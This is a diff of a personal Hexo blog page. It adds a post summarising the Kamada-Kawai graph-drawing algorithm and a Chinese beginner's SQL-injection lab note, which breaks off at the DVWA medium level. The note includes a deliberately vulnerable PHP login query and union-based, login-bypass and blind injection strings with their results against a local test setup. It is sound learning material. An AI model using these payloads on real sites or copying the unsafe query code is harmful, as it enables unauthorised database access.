@@ -281,6 +281,434 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/10/07/An-Algorithm-For-Drawing-General-Undirected-Graphs/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Nina">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Nina's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/10/07/An-Algorithm-For-Drawing-General-Undirected-Graphs/" itemprop="url">
+                  An Algorithm For Drawing General Undirected Graphs
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+
+              
+                
+              
+
+              <time title="Created: 2018-10-07 18:49:15" itemprop="dateCreated datePublished" datetime="2018-10-07T18:49:15+08:00">2018-10-07</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Edited on</span>
+                
+                <time title="Modified: 2018-10-08 01:07:06" itemprop="dateModified" datetime="2018-10-08T01:07:06+08:00">2018-10-08</time>
+              
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/visualization/" itemprop="url" rel="index"><span itemprop="name">visualization</span></a></span>
+
+                
+                
+                  , 
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/visualization/graph-layout/" itemprop="url" rel="index"><span itemprop="name">graph layout</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>This is where the stress energy began. In this paper, the stress spring energy is introduced and the basic idea of graph layout is to minimize it. This paper also introduce an approach to calculate the local minimization.</p>
+<h2 id="Spring-Model"><a href="#Spring-Model" class="headerlink" title="Spring Model"></a>Spring Model</h2><p><strong>Spring energy:</strong><br>$$<br>E=\sum_{i=1}^{n-1}\sum_{j=i+1}^n\frac{1}{2}k_{ij}(\Vert p_i-p_j\Vert -l_{ij})^2<br>$$<br>With $l_{ij}$ the desired length<br>$$<br>l_{ij}=L\times d_{ij}<br>$$<br>$d_{ij}$ is the shortest path length between node i and j.</p>
+<p>And L can be defined as:<br>$$<br>L=L_0/\max_{i\lt j} d_{ij}<br>$$</p>
+<p>$k_{ij}$ is the strength between node $i$ and $j$:<br>$$<br>k_{ij}=\frac{K}{d_{ij}^2}<br>$$<br>with $K$ a constant.</p>
+<h2 id="Local-Minimization"><a href="#Local-Minimization" class="headerlink" title="Local Minimization"></a>Local Minimization</h2><p>The necessary condition of local minimum is:<br>$$<br>\Vert \frac{\partial E}{\partial p_m}\Vert =0\;\;\;\;for\;1\leq m\leq n<br>$$</p>
+<p>In the following analysis we consider the case of 2D.</p>
+<p>So the local minimum problem is changed to:<br>$$<br>\frac{\partial E}{\partial x_m}=\frac{\partial E}{\partial y_m}=0<br>$$</p>
+<p>As the problem is not linear, what’s more, $x_i$ are not independent to each other, so another solution implemented from Newton-Raphson method is adopted.</p>
+<h3 id="Newton-Raphson"><a href="#Newton-Raphson" class="headerlink" title="Newton-Raphson"></a>Newton-Raphson</h3><p>Newton-Raphson method is an iterative way to find the solution of function:<br>$$<br>f(x)=0<br>$$</p>
+<p>the method contains the following step:</p>
+<ol>
+<li>use $x_0$ as the initial point</li>
+<li>find the intersection of axe x and tangent of $f(x_0)$: $x_1$</li>
+<li>repeat step 2 at new intersections till convergence.</li>
+</ol>
+<p><img src="/../images/KAMADA/newton.jpg" alt="Newton-Raphson"></p>
+<h3 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h3><p>For node $m$:<br>$$<br>\Delta_m=\sqrt{\left(\frac{\partial E}{\partial x_m}\right)^2+\left(\frac{\partial E}{\partial y_m}\right)^2}<br>$$<br>Firstly we choose the one with maximum $\Delta_m$.</p>
+<p>From now on we focus on axe x:<br>$$<br>\begin{aligned}<br>\frac{\partial E}{\partial x_i}&amp;=\frac{\partial \sum_{j\neq i}\frac{1}{2}k_{ij}((x_i-x_j)^2+l_{ij}^2-2l_{ij}\sqrt{(x_i-x_j)^2+(y_i-y_j)^2})}{\partial x_i}\\<br>&amp;=\sum_{i\neq j}k_{ij}(x_i-x_j-\frac{l_{ij}(x_i-x_j)}{\sqrt{(x_i-x_j)^2+(y_i-y_j)^2}})\\<br>&amp;=0<br>\end{aligned}<br>$$<br>At the t<sup>th</sup> iteration, suppose $p_m=[x_m,y_m]$:</p>
+<p>$$<br>\begin{aligned}<br>&amp;\frac{\partial E/\partial x_m}{\partial p_m}(x_m(t),y_m(t))[\delta x_m,\delta y_m]\\<br>=&amp;[\frac{\partial^2 E}{\partial x_m^2}(x_m(t),y_m(t)),\frac{\partial^2 E}{\partial x_m\partial y_m}(x_m(t),y_m(t))]^T[\delta x_m,\delta y_m]\\<br>=&amp;-\frac{\partial E}{\partial x_m}(x_m(t),y_m(t))<br>\end{aligned}<br>$$<br>So<br>$$<br>\frac{\partial^2 E}{\partial x_m^2}(x_m(t),y_m(t))\delta x_m+\frac{\partial^2 E}{\partial x_m\partial y_m}(x_m(t),y_m(t))\delta y_m<br>=-\frac{\partial E}{\partial x_m}(x_m(t),y_m(t))<br>$$<br>The same as axe y, so we have two equations with two variables, and we could calculate $\delta x_m$ and $\delta y_m$, hence $[x_m(t+1),y_m(t+1)]$ is known.</p>
+<p>After all iterations, the position of $x_m$ is optimized, so the next node m with $\max{\Delta_m}$ should be selected until<br>$$\max{\Delta_m}\lt\epsilon$$</p>
+<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>[1] Kamada T. AN ALGORITHM FOR DRAWING GENERAL UNDIRECTED GRAPHS[J]. Information Processing Letters, 1989, 31(1):7-15.</p>
+
+          
+        
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/10/01/SQLInjection1-php-and-MySQL/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Nina">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Nina's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/10/01/SQLInjection1-php-and-MySQL/" itemprop="url">
+                  SQLInjection1: php and MySQL
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+
+              
+                
+              
+
+              <time title="Created: 2018-10-01 16:43:22" itemprop="dateCreated datePublished" datetime="2018-10-01T16:43:22+08:00">2018-10-01</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Edited on</span>
+                
+                <time title="Modified: 2018-10-02 16:57:20" itemprop="dateModified" datetime="2018-10-02T16:57:20+08:00">2018-10-02</time>
+              
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/web-security/" itemprop="url" rel="index"><span itemprop="name">web security</span></a></span>
+
+                
+                
+                  , 
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/web-security/SQLInjection/" itemprop="url" rel="index"><span itemprop="name">SQLInjection</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>继续中文。。。这就是用SQL注入的教程复现了一下，顺便memo一下自己作为一个初学者的理解。。。<br>教程地址：<a href="https://wizardforcel.gitbooks.io/mst-sec-lecture-notes/content/%E6%BC%8F%E6%B4%9E%E7%AF%87%20SQL%E6%B3%A8%E5%85%A5.html" target="_blank" rel="noopener">米斯特白帽培训讲义 漏洞篇 SQL 注入</a></p>
+<h2 id="mac配置MySQL"><a href="#mac配置MySQL" class="headerlink" title="mac配置MySQL"></a>mac配置MySQL</h2><ol>
+<li>下载安装，在“系统偏好设置”里面点击MySQL并运行。</li>
+<li><p>配置环境变量：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">echo $HOME</span><br><span class="line">cd $HOME</span><br><span class="line">sudo vim .bash_profile</span><br><span class="line">export PATH=$&#123;PATH&#125;:/usr/local/mysql/bin</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>登录：<code>mysql -u root -p</code></p>
+</li>
+</ol>
+<h2 id="写PHP并连接数据库"><a href="#写PHP并连接数据库" class="headerlink" title="写PHP并连接数据库"></a>写PHP并连接数据库</h2><p>乖巧看教程吧<br>启动PHP内置服务器：<br><code>php -S 127.0.0.1:80</code><br>再访问 <a href="http://localhost/sql.php" target="_blank" rel="noopener">http://localhost/sql.php</a> （如果php文件名叫这个的话）</p>
+<h2 id="基于回显的手工注入"><a href="#基于回显的手工注入" class="headerlink" title="基于回显的手工注入"></a>基于回显的手工注入</h2><p>简单来说就是有会返回并显示出个人信息或其他从数据库中获取的数据的地方。<br>教程里的注入点是数值型注入，字符注入在教程末尾有。</p>
+<h3 id="memo1-union"><a href="#memo1-union" class="headerlink" title="memo1(union):"></a>memo1(union):</h3><p>在已经确定搜索返回两个数据之后：</p>
+<pre><code>1 and 1=2 union select 1,2
+</code></pre><p>我们的输出是2<br><strong>来自一个sql初学者的解释</strong></p>
+<blockquote>
+<p>union是把所有select的结果取并集，而 1 and 1=2 是错误的所以不会输出任何的结果，这样sql返回值就变成了[1,2]<br>显示2就说明显示的数据是第二个<br>这样在之后的探索过程中，我们就可以把第一个值固定为1，对回显的数据进行操作。</p>
+</blockquote>
+<h3 id="memo2-limit"><a href="#memo2-limit" class="headerlink" title="memo2(limit):"></a>memo2(limit):</h3><p>在查询表名步骤：</p>
+<pre><code>1 and 1=2 union select 1,table_name from information_schema.tables where table_schema=database() limit ?,1
+</code></pre><p><strong>limit a,b</strong> 表示按搜索结果从第a行开始，输出b个结果。</p>
+<h2 id="没有回显的手工注入"><a href="#没有回显的手工注入" class="headerlink" title="没有回显的手工注入"></a>没有回显的手工注入</h2><p>基本思路：</p>
+<ol>
+<li>根据information_schema数据库爆破名字长度（比如数据库名字，表格名字等等）</li>
+<li>已知名字长度去爆破每一位的字符: a ~ z 、 0 ~ 9 以及_的 ASCLL 十六进制</li>
+<li>找到名字再进入下一层</li>
+</ol>
+<h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>改了一改教程的代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">&lt;form method=<span class="string">"GET"</span> action=<span class="string">""</span>&gt;</span><br><span class="line">    &lt;p&gt; log in: &lt;/p&gt;</span><br><span class="line">    Username: &lt;input type=<span class="string">"text"</span> name=<span class="string">"user"</span> /&gt;</span><br><span class="line">    Password: &lt;input type=<span class="string">"text"</span> name=<span class="string">"passwd"</span> /&gt;</span><br><span class="line">    &lt;br/&gt;</span><br><span class="line">    &lt;br/&gt;</span><br><span class="line">    &lt;input type=<span class="string">"submit"</span> value=<span class="string">"search"</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$host = <span class="string">'127.0.0.1'</span>;</span><br><span class="line">$port = <span class="number">3306</span>;</span><br><span class="line">$un = <span class="string">''</span>;</span><br><span class="line">$pw = <span class="string">''</span>;</span><br><span class="line">$db = <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line">$Username = @$_GET[<span class="string">'user'</span>];</span><br><span class="line">$Passwd = @$_GET[<span class="string">'passwd'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($Username == <span class="string">''</span>)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"><span class="keyword">if</span>($Passwd == <span class="string">''</span>)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">$conn = @mysql_connect($host . <span class="string">':'</span> . $port, $un, $pw);</span><br><span class="line"><span class="keyword">if</span>(!$conn)</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Error in connecting database'</span> . mysql_error());</span><br><span class="line">mysql_select_db($db, $conn);</span><br><span class="line"></span><br><span class="line">$sql = <span class="string">"select id, user from sqlphp where user='$Username' and passwd='$Passwd'"</span>;</span><br><span class="line">$res = mysql_query($sql, $conn);</span><br><span class="line"><span class="keyword">if</span>(!$res)</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'error in searching'</span>. mysql_error());</span><br><span class="line">$num = mysql_num_rows($res);</span><br><span class="line"><span class="keyword">if</span>($num == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Sorry, your username or password is wrong!"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    $row = mysql_fetch_row($res);</span><br><span class="line">    <span class="comment"># echo "&lt;p&gt;Hello, $Username&lt;/p&gt;";</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Hello, &#123;$row[1]&#125;&lt;/p&gt;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Welcome!&lt;/p&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mysql_close($conn);</span><br></pre></td></tr></table></figure>
+<p>没被注释掉的是有回显的，被注释掉的是没有回显的。</p>
+<h3 id="有回显"><a href="#有回显" class="headerlink" title="有回显"></a>有回显</h3><pre><code>username=1&apos; or &apos;1&apos;=&apos;1
+passwd=1&apos; or &apos;1&apos;=&apos;1
+</code></pre><p>=&gt; Hello admin, welcome!</p>
+<pre><code>username=admin&apos; order by 1#
+passwd=1&apos; or &apos;1&apos;=&apos;1
+</code></pre><p>=&gt; Hello admin, welcome!</p>
+<pre><code>username=admin&apos; order by 3#
+passwd=1&apos;or&apos;1&apos;=&apos;1
+</code></pre><p>=&gt; error …</p>
+<pre><code>username=1&apos; union select 1,2#
+passwd=1&apos;or&apos;1&apos;=&apos;1
+</code></pre><p>=&gt; Hello 2, welcome!</p>
+<p>嘛后面就一样了</p>
+<h3 id="没有回显"><a href="#没有回显" class="headerlink" title="没有回显"></a>没有回显</h3><p>个人测试下来并不需要用ascii码的16进制而是直接用字符就可以了，不知道是不是MySQL的版本问题</p>
+<pre><code>username=1&apos; or (select length(database()))=11#
+passwd=1&apos; or &apos;1&apos;=&apos;1
+</code></pre><p>=&gt; Hello 1’ or (select length(database()))=11#, welcome!</p>
+<pre><code>username= 1&apos; or (select substr(database(),1,1))=&apos;e&apos;#
+passwd=1&apos; or &apos;1&apos;=&apos;1
+</code></pre><p>=&gt; Hello  1’ or (select substr(database(),1,1))=’e’#, welcome!</p>
+<h2 id="进阶"><a href="#进阶" class="headerlink" title="进阶"></a>进阶</h2><p>从这里开始换教程：<a href="http://www.freebuf.com/articles/web/120747.html" target="_blank" rel="noopener">新手指南：DVWA-1.9全级别教程之SQL Injection</a><br>跳过low（因为和前面差不多），直接从medium开始。</p>
+<h3 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h3><p>增加函数：</p>
+<ul>
+<li>mysql_real_escape_string: 转义 SQL 语句中使用的字符串中的特殊字符: （例：1’ -&gt; 1\’）</li>
+</ul>
+<p>这种方法对数字型注入基本无效。。。<br>对自己写的字符型注入：</p>
+
+          
+        
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/09/26/Laplacian-based-Dynamic-Graph-Visualization/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1875,171 +2303,11 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/06/26/hello-world/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Nina">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Nina's Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/06/26/hello-world/" itemprop="url">
-                  Hello World
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-
-              
-                
-              
-
-              <time title="Created: 2018-06-26 00:34:31" itemprop="dateCreated datePublished" datetime="2018-06-26T00:34:31+08:00">2018-06-26</time>
-            
-
-            
-              
-
-              
-                
-                <span class="post-meta-divider">|</span>
-                
-
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">Edited on</span>
-                
-                <time title="Modified: 2018-07-21 16:17:29" itemprop="dateModified" datetime="2018-07-21T16:17:29+08:00">2018-07-21</time>
-              
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>
-
-          
-        
-      
-    </div>
-
-    
-
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span>
+    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/3/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
   </nav>
 
 
@@ -2086,7 +2354,7 @@
                 
                   <a href="/archives/">
                 
-                    <span class="site-state-item-count">19</span>
+                    <span class="site-state-item-count">21</span>
                     <span class="site-state-item-name">posts</span>
                   </a>
                 </div>
@@ -2127,7 +2395,9 @@
                     
                       
                     
-                    <span class="site-state-item-count">14</span>
+                      
+                    
+                    <span class="site-state-item-count">15</span>
                     <span class="site-state-item-name">categories</span>
                   </a>
                 </div>
@@ -2196,7 +2466,11 @@
                     
                       
                     
-                    <span class="site-state-item-count">28</span>
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">30</span>
                     <span class="site-state-item-name">tags</span>
                   </a>
                 </div>
@@ -2411,6 +2685,8 @@
     
       
         
+      
+    
       
     
       
